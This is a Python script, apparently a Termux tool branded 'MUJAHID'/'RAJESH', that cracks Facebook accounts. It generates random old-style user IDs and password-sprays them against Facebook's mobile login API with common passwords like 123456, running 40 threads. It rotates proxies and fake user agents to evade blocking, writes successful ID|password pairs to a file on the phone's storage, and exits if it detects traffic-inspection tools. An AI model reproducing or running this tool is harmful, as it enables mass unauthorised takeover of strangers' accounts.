# 𝐑𝐀𝐉𝐄𝐒𝐇
# =[•]=[SCRIPT]=[ADMIN]=[𝐑𝐀𝐉𝐄𝐒𝐇]=[•]=
#----------------------------------------------------------------#
import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json,urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f"pip install {module}")

from requests.exceptions import ConnectionError
from requests import api, models, sessions
try:
    api_body = open(api.__file__, "r").read()
    models_body = open(models.__file__, "r").read()
    session_body = open(sessions.__file__, "r").read()
    word_list = ["print", "lambda", "zlib.decompress"]
    for word in word_list:
        if word in api_body or word in models_body or word in session_body:
            exit()
except:
    pass

class sec:
    def __init__(self):
        paths = [
            "/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py",
            "/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py",
            "/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py"
        ]
        for path in paths:
            if "print" in open(path, "r").read():
                self.fuck()
        if os.path.exists("/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png") or \
           os.path.exists("/storage/emulated/0/Android/data/com.guoshi.httpcanary"):
            self.fuck()

    def fuck(self):
        print(f" \033[1;32m Congratulations ! ")
        self.linex()
        exit()

    def linex(self):
        print(f"\x1b[38;5;48m\x1b[38;5;45m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
method = []
oks = []
cps = []
loop = 0
user = []
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'
import random, requests, time, sys
from threading import Thread, Lock

PROXIES = []
PROXY_LOCK = Lock()

# ------------------ Proxy Fetcher ------------------
def fetch_proxies(country="SG", interval=30):
    """
    Proxy loader that refreshes list every `interval` seconds.
    """
    global PROXIES
    url = f"https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=3000&country={country}&ssl=all&anonymity=all"
    while True:
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                proxies = [p.strip() for p in response.text.strip().split("\n") if p.strip()]
                with PROXY_LOCK:
                    PROXIES = proxies
                print(f"[+] Loaded {len(proxies)} proxies ({country})")
            else:
                print(f"[x] Proxy API error: {response.status_code}")
        except Exception as e:
            print(f"[x] Proxy fetch failed: {e}")
        time.sleep(interval)

# ------------------ Fresh User-Agent Generator ------------------
BASE_UA = [
    # পুরানো (2009–2015 style)
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.{build}.100 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.{build}.52 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/{ver}.0 Mobile/13E233 Safari/601.1",

    # নতুন (2019–2025 style)
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; en-SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.{build}.90 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro; en-SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.{build}.70 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{ver}.0 Mobile/15E148 Safari/604.1"
]

def fresh_user_agent():
    """
    Random realistic User-Agent generator.
    """
    template = random.choice(BASE_UA)
    return template.format(
        ver=random.randint(80, 130),      # এখনকার Chrome range: 80–130
        build=random.randint(2000, 9000)  # Build number fresh
    )

# ------------------ Request Sender ------------------
def send_request(url, max_retries=5):
    """
    Sends a GET request with random proxy + user-agent.
    """
    for attempt in range(max_retries):
        with PROXY_LOCK:
            if not PROXIES:
                print("[!] No proxies loaded yet!")
                return None
            proxy = random.choice(PROXIES)

        headers = {"User-Agent": fresh_user_agent()}
        proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}

        try:
            r = requests.get(url, headers=headers, proxies=proxy_dict, timeout=10)
            if r.status_code == 200:
                print(f"[✓] {r.status_code} OK | Proxy: {proxy} | UA: {headers['User-Agent']}")
                return r
            else:
                print(f"[~] Bad Response {r.status_code} | Proxy: {proxy}")
        except Exception as e:
            print(f"[x] Error {attempt+1}/{max_retries} | Proxy: {proxy} | {e}")
            with PROXY_LOCK:
                if proxy in PROXIES:
                    PROXIES.remove(proxy)
            time.sleep(1)

    print("[x] All retries failed!")
    return None


def ____banner____():
    if "win" in sys.platform:
        os.system("cls")
    else:
        os.system("clear")
    print(f"""      \x1b[38;5;202m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      \x1b[38;5;196m▗▖  ▗▖▗▖ ▗▖   ▗▖ ▗▄▖ ▗▖ ▗▖▗▄▄▄▖▗▄▄▄ 
      \x1b[38;5;202m▐▛▚▞▜▌▐▌ ▐▌   ▐▌▐▌ ▐▌▐▌ ▐▌  █  ▐▌  █
      \x1b[38;5;202m▐▌  ▐▌▐▌ ▐▌   ▐▌▐▛▀▜▌▐▛▀▜▌  █  ▐▌  █
      \x1b[38;5;214m▐▌  ▐▌▝▚▄▞▘▗▄▄▞▘▐▌ ▐▌▐▌ ▐▌▗▄█▄▖▐▙▄▄▀
      \x1b[38;5;45m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
       \x1b[38;5;46m(\033[1;33m★\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196m\x1b[38;5;46mVERSION\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196m(\33[0;44m0.1\033[0;92m\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196m(\033[1;37m\33[0;45m22-Aug-2025\033[0;92m\x1b[38;5;46m)
       \x1b[38;5;46m(\033[1;33m★\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196mAUTHOR\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196m(\033[1;33m★\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196mMUJAHID      \x1b[38;5;46m(\033[1;33m★\x1b[38;5;46m)
       \x1b[38;5;46m(\033[1;33m★\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196mGITHUB\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196m(\033[1;33m★\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196mMUJAHID-404  \x1b[38;5;46m(\033[1;33m★\x1b[38;5;46m)
       \x1b[38;5;46m(\033[1;33m★\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196mSTATUS\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196m(\033[1;33m★\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196mOLD CRACKING \x1b[38;5;46m(\033[1;33m★\x1b[38;5;46m)
\x1b[38;5;202m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")




def creationyear(uid):
    if len(uid) == 15:
        if uid[:10] in ('1000000000',): MUJAHID = '2009'
        elif uid[:9] in ('100000000',): MUJAHID = '2009'
        elif uid[:8] in ('10000000',): MUJAHID = '2009'
        elif uid[:7] in ('1000000'): MUJAHID = '2009'
        elif uid[:7] in ('1000006',): MUJAHID = '2010'
        elif uid[:6] in ('100001',): MUJAHID = '2010'
        elif uid[:6] in ('100002'): MUJAHID = '2011'
        elif uid[:6] in ('100004',): MUJAHID = '2012'
        elif uid[:6] in ('100005'): MUJAHID = '2013'
        elif uid[:6] in ('100007'): MUJAHID = '2014'
        elif uid[:6] in ('100009',): MUJAHID = '2015'
        elif uid[:5] in ('10001',): MUJAHID = '2016'
        elif uid[:5] in ('10002',): MUJAHID = '2017'
        elif uid[:5] in ('10003',): MUJAHID = '2018'
        elif uid[:5] in ('10004',): MUJAHID = '2019'
        elif uid[:5] in ('10005',): MUJAHID = '2020'
        elif uid[:5] in ('10006',): MUJAHID = '2021'
        elif uid[:5] in ('10009',): MUJAHID = '2023'
        elif uid[:5] in ('10007'): MUJAHID = '2022'
        else: MUJAHID = ''
    elif len(uid) in (9, ): MUJAHID = '2008'
    elif len(uid) == 8: MUJAHID = '2007'
    elif len(uid) == 7: MUJAHID = '2006'
    elif len(uid) == 14 and uid[:2] in ('61',): MUJAHID = '2024'
    else: MUJAHID = ''
    return MUJAHID





def clear():
    os.system("clear")

def linex():
    print(f"\x1b[38;5;45m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def _RAJESH__KING_():
    ____banner____()
    print(f'       \x1b[38;5;46m(\033[1;37mA\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196mOLD CLONE')
    linex()
    __Jihad__ = input(f'       \x1b[38;5;46m(\033[1;33m★\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196mCHOICE  {W}: {Y}')
    if __Jihad__ in ['A', 'a', '01', '1']:
        old_clone()
    else:
        print(f'\n    {rad}Choose Valid Option... ')
        time.sleep(2)
        _RAJESH__KING_()
def old_clone():
    ____banner____()
    print(f'       \x1b[38;5;46m(\033[1;37mA\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196m2010\033[1;37m13\x1b[38;5;46m SERIES');linex()
    print(f'       \x1b[38;5;46m(\033[1;37mB\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196m2009\033[1;37m10\x1b[38;5;46m SERIES');linex()
    _input = input(f'       \x1b[38;5;46m(\033[1;33m★\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196mCHOICE  {W}: {Y}')
    if _input in ['A','a','01','1']:
        old_One()
    elif _input in ['B','b','02','2']:
        old_Tree()
    else:
        print(f'\n[×]{rad} Choose Value Option... ')
        os.system('xdg-open https://t.me/MUJAHIDvailoveyou')
        _RAJESH__KING_()
def old_One():
    user = []
    ____banner____()
    print(f'       \x1b[38;5;46m(\033[1;33m★\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196mOld Code {Y}:{W} 2010-2014')
    ask = input(f'       \x1b[38;5;46m(\033[1;33m★\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196mSELECT {Y}:{W} ')
    linex()
    ____banner____()
    print(f'       \x1b[38;5;46m(\033[1;33m★\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196mEXAMPLE {Y}:{W} 20000 / 30000 / 99999')
    limit = input(f'       \x1b[38;5;46m(\033[1;33m★\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196mSELECT {Y}:{W} ')
    linex()
    star = "10000"
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 9999999999)))
        user.append(data)
    print(f'        \x1b[38;5;46m(\033[1;37mA\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196mMETHOD 1')
    print(f'       \x1b[38;5;46m(\033[1;37mB\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196mMethod 2')
    linex()
    meth = input(f"       \x1b[38;5;46m(\033[1;33m★\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=40) as pool:
        ____banner____()
        print(f"       \x1b[38;5;46m(\033[1;33m★\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196mTOTAL ID FROM CRACK {Y}: {W} {limit}{W}")
        print(f"       \x1b[38;5;46m(\033[1;33m★\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for mal in user:
            uid = star + mal
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break

def old_Tree():
    user = []
    ____banner____()
    print(f'       \x1b[38;5;46m(\033[1;33m★\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196mOLD CODE {Y}:{W} 2009-2010')
    ask = input(f'       \x1b[38;5;46m(\033[1;33m★\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196mSELECT {Y}:{W} ')
    linex()
    ____banner____()
    print(f'       \x1b[38;5;46m(\033[1;33m★\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196mEXAMPLE {Y}:{W} 20000 / 30000 / 99999')
    limit = input(f'       \x1b[38;5;46m(\033[1;33m★\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196mTOTAL ID COUNT {Y}:{W} ')
    linex()
    prefix = "100"
    for _ in range(int(limit)):
        suffix = ''.join(random.choices("0123456789", k=12))
        uid = prefix + suffix
        user.append(uid)
    print(f'       \x1b[38;5;46m(\033[1;37mA\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196mMETHOD A')
    print(f'       \x1b[38;5;46m(\033[1;37mB\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196mMethod B')
    linex()
    meth = input(f"       \x1b[38;5;46m(\033[1;33m★\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=40) as pool:
        ____banner____()
        print(f"       \x1b[38;5;46m(\033[1;33m★\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
        print(f"       \x1b[38;5;46m(\033[1;33m★\x1b[38;5;46m)\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break 
def login_1(uid):
    global oks, loop
    session = requests.session()
    try:
        sys.stdout.write(f'\r\r\x1b[38;5;196m(\033[1;37mMUJAHID\x1b[38;5;196m>\x1b[38;5;46mM1\x1b[38;5;196m)\033[1;37m>\x1b[38;5;45m\033[1;37m<\x1b[38;5;196m(\x1b[38;5;43m{uid}\x1b[38;5;196m)\033[1;37m>\x1b[38;5;45m\033[1;37m<\x1b[38;5;196m(\x1b[38;5;46m{loop}\x1b[38;5;196m)\033[1;37m>\x1b[38;5;45m\033[1;37m<\x1b[38;5;196m(\033[1;37mOK\x1b[38;5;196m/\x1b[38;5;46m{len(oks)}\x1b[38;5;196m)')
        sys.stdout.flush()
        for pw in ["123456789", "123456", "1234567", "12345678", "1234567890"]:
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }                
            headers = {
                'User-Agent': fresh_user_agent(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post("https://b-graph.facebook.com/auth/login", data=data, headers=headers, allow_redirects=False).json()
            if "session_key" in res:
                print(f'\r\r\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196m(\033[1;37mMUJAHID\x1b[38;5;46m) \033[1;97m= \x1b[38;5;46m{uid} \033[1;97m= \x1b[38;5;46m{pw} \033[1;97m= \x1b[38;5;45m{creationyear(uid)}')
                open("/sdcard/MUJAHID-OLD-M1-OK.txt", "a").write(uid + "|" + pw + "\n")
                oks.append(uid)
                break
            elif "www.facebook.com" in res.get('error', {}).get('message', ''):
                print(f'\r\r\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196m(\033[1;37mMUJAHID\x1b[38;5;46m) \033[1;97m= \x1b[38;5;46m{uid} \033[1;97m= \x1b[38;5;46m{pw} \033[1;97m= \x1b[38;5;45m{creationyear(uid)}')
                open("/sdcard/MUJAHID-OLD-M1-OK.txt", "a").write(uid + "|" + pw + "\n")
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)

def login_2(uid):
    global oks, loop
    sys.stdout.write(f'\r\r\x1b[38;5;196m(\033[1;37mMUJAHID\x1b[38;5;196m>\x1b[38;5;46mM2\x1b[38;5;196m)\033[1;37m>\x1b[38;5;45m\033[1;37m<\x1b[38;5;196m(\x1b[38;5;43m{uid}\x1b[38;5;196m)\033[1;37m>\x1b[38;5;45m\033[1;37m<\x1b[38;5;196m(\x1b[38;5;46m{loop}\x1b[38;5;196m)\033[1;37m>\x1b[38;5;45m\033[1;37m<\x1b[38;5;196m(\033[1;37mOK\x1b[38;5;196m/\x1b[38;5;46m{len(oks)}\x1b[38;5;196m)')
    try:
        for pw in ['123456','123123','1234567','12345678','123456789']:
            with requests.Session() as session:
                headers={'x-fb-connection-bandwidth': str(rr(20000000,29999999)),'x-fb-sim-hni': str(rr(20000,40000)),'x-fb-net-hni': str(rr(20000,40000)),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent': vipuua(),'content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
            po=session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20×tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",headers=headers).json()
            if "session_key" in str(po):
                print(f'\r\r\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196m(\033[1;37mMUJAHID\x1b[38;5;46m) \033[1;97m= \x1b[38;5;46m{uid} \033[1;97m= \x1b[38;5;46m{pw} \033[1;97m= \x1b[38;5;45m{creationyear(uid)}')
                open("/sdcard/MUJAHID-OLD-M2-OK.txt", "a").write(uid + "|" + pw + "\n")
                oks.append(uid)
                break
            elif "session_key" in po:
                print(f'\r\r\033[1;37m>\x1b[38;5;196m×\033[1;37m<\x1b[38;5;196m(\033[1;37mMUJAHID\x1b[38;5;46m) \033[1;97m= \x1b[38;5;46m{uid} \033[1;97m= \x1b[38;5;46m{pw} \033[1;97m= \x1b[38;5;45m{creationyear(uid)}')
                open("/sdcard/MUJAHID-OLD-M2-OK.txt", "a").write(uid + "|" + pw + "\n")
                oks.append(uid)
                break
            else:pass
        loop+=1
    except Exception as e:pass
_RAJESH__KING_()